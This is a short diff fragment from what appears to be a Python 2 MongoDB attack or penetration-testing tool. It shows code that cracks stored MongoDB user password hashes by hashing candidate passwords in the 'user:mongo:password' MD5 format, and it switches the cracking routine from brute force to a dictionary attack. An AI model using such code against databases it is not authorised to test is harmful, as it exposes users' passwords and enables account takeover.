+		count += 1
+		if md5(user + ":mongo:" + str(attempt)).hexdigest() == key:
+			print "\nFound - " + user + ":" + attempt
+			break
+	return
+	
 def getDBInfo():
 	curLen = 0
 	nameLen = 0
@@ -1638,15 +1982,17 @@ def getDBInfo():
 			menuItem +=1
 				
 		userIndex = raw_input("Select user hash to crack: ")
-		brute_pass(users[int(userIndex)-1],hashes[int(userIndex)-1])
+		dict_pass(users[int(userIndex)-1],hashes[int(userIndex)-1])
 		
 		crackHash = raw_input("Crack another hash (y/n)?")		
 	raw_input("Press enter to continue...")
 	return
-	
+
+
 def signal_handler(signal, frame):
     print "\n"
     print "CTRL+C detected.  Exiting."
     sys.exit()
+
 signal.signal(signal.SIGINT, signal_handler)
 mainMenu()
